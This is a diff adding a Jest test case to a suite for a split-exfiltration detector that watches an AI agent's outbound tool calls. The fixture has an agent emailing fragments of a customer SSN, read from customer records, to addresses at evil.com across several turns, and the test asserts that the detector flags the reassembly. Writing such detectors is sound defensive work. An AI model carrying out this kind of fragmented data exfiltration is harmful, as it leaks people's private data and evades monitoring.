@@ -278,6 +278,48 @@ describe('detectSplitExfiltration', () => {
       expect(result?.destination).toBe('evil.com');
       expect(result?.destinationCallCount).toBe(2);
     });
+
+    it('should flag fragment reassembly when a sensitive numeric identifier is split across outbound turns', () => {
+      const session = makeSessionWithOutboundHistory(
+        [
+          {
+            toolName: 'sendEmail',
+            turnId: 'turn-000',
+            bytes: 40,
+            destination: 'ops@evil.com',
+            text: '{"recipient":"ops@evil.com","body":"12345"}',
+          },
+        ],
+        {
+          privilegedValues: [],
+          sensitiveEntities: [
+            {
+              type: 'ssn',
+              rawValue: '123-45-6789',
+              canonicalValue: '123456789',
+              sourceTool: 'readCustomerRecords',
+              fieldName: 'ssn',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+          ],
+        },
+      );
+
+      const ctx = makeCtx({
+        toolArguments: {
+          recipient: 'audit@evil.com',
+          body: '6789',
+        },
+      });
+
+      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
+      expect(result).not.toBeNull();
+      expect(result?.destinationCluster).toBe(true);
+      expect(result?.fragmentReassembly).toBe(true);
+      expect(result?.destination).toBe('evil.com');
+      expect(result?.matchedFields).toContain('123-45-6789');
+    });
   });
 
   describe('does not fire on benign cases', () => {
